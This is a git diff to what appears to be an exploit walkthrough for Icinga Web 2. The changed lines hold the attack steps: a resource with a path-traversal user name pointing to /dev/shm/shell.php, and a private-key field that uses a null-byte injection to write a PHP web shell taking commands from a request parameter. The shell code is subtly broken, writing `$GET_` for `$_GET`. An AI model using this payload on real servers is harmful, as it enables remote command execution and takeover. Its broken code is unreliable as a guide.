@@ -84,7 +84,7 @@ Configuration -> Resources -> Create a New Resource
 ```
 
 ![image](https://user-images.githubusercontent.com/127159644/227716048-237d1f3a-7535-4739-8037-a86ef582bab4.png)
-![image](https://user-images.githubusercontent.com/127159644/227716058-db126367-eb25-4ba1-a56b-ffa13c8acc90.png)
+![image](https://user-images.githubusercontent.com/127159644/227717046-d866a18b-3ac6-404e-b7ad-048713edf872.png)
 ![image](https://user-images.githubusercontent.com/127159644/227716355-f8dd1102-2d01-45f0-808c-5352a308e017.png)
 
 Now to get rce we need to create another resource
@@ -93,5 +93,5 @@ Now to get rce we need to create another resource
 Resource Type: SSH Identity
 Resource Name: shell.php
 User:../../../../../../dev/shm/shell.php
-Private Key: file:///etc/icingaweb2/ssh/ssh-user%00 <?php system($GET_['cmd']);?>
+Private Key: file:///etc/icingaweb2/ssh/haxor%00 <?php system($GET_['cmd']);?>
 ```
